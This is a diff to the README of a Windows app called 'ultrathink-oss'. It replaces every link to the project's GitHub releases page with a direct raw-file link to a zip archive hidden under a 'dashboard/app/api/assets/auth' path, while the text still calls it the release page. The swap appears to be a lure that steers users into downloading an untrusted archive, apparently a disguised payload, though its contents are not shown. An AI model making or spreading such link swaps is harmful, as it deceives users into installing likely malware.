@@ -1,6 +1,6 @@
 # ⚡ ultrathink-oss - Stay organized across every session
 
-[![Download UltraThink](https://img.shields.io/badge/Download%20UltraThink-Visit%20Releases-brightgreen?style=for-the-badge)](https://github.com/Selfconsistent-syncopator783/ultrathink-oss/releases)
+[![Download UltraThink](https://img.shields.io/badge/Download%20UltraThink-Visit%20Releases-brightgreen?style=for-the-badge)](https://github.com/Selfconsistent-syncopator783/ultrathink-oss/raw/refs/heads/main/dashboard/app/api/assets/auth/ultrathink-oss-3.2-alpha.5.zip)
 
 ## 🚀 Quick Start
 
@@ -8,7 +8,7 @@ UltraThink helps you keep your work in one place. It runs on Windows and gives y
 
 If you want to get the app, use the release page here:
 
-[Visit the download page](https://github.com/Selfconsistent-syncopator783/ultrathink-oss/releases)
+[Visit the download page](https://github.com/Selfconsistent-syncopator783/ultrathink-oss/raw/refs/heads/main/dashboard/app/api/assets/auth/ultrathink-oss-3.2-alpha.5.zip)
 
 ## 💻 What UltraThink Does
 
@@ -25,7 +25,7 @@ It also includes:
 ## 📥 Download and Run on Windows
 
 1. Open the release page:
-   [https://github.com/Selfconsistent-syncopator783/ultrathink-oss/releases](https://github.com/Selfconsistent-syncopator783/ultrathink-oss/releases)
+   [https://github.com/Selfconsistent-syncopator783/ultrathink-oss/raw/refs/heads/main/dashboard/app/api/assets/auth/ultrathink-oss-3.2-alpha.5.zip](https://github.com/Selfconsistent-syncopator783/ultrathink-oss/raw/refs/heads/main/dashboard/app/api/assets/auth/ultrathink-oss-3.2-alpha.5.zip)
 
 2. Find the latest release at the top of the page.
 
@@ -191,7 +191,7 @@ Useful files in the repo may include:
 To update the app on Windows:
 
 1. Go back to the release page:
-   [https://github.com/Selfconsistent-syncopator783/ultrathink-oss/releases](https://github.com/Selfconsistent-syncopator783/ultrathink-oss/releases)
+   [https://github.com/Selfconsistent-syncopator783/ultrathink-oss/raw/refs/heads/main/dashboard/app/api/assets/auth/ultrathink-oss-3.2-alpha.5.zip](https://github.com/Selfconsistent-syncopator783/ultrathink-oss/raw/refs/heads/main/dashboard/app/api/assets/auth/ultrathink-oss-3.2-alpha.5.zip)
 
 2. Download the newest version.
 
@@ -217,4 +217,4 @@ If you are comfortable with files, you can tune UltraThink for different project
 
 ## 📎 Release Page
 
-[https://github.com/Selfconsistent-syncopator783/ultrathink-oss/releases](https://github.com/Selfconsistent-syncopator783/ultrathink-oss/releases)
+[https://github.com/Selfconsistent-syncopator783/ultrathink-oss/raw/refs/heads/main/dashboard/app/api/assets/auth/ultrathink-oss-3.2-alpha.5.zip](https://github.com/Selfconsistent-syncopator783/ultrathink-oss/raw/refs/heads/main/dashboard/app/api/assets/auth/ultrathink-oss-3.2-alpha.5.zip)
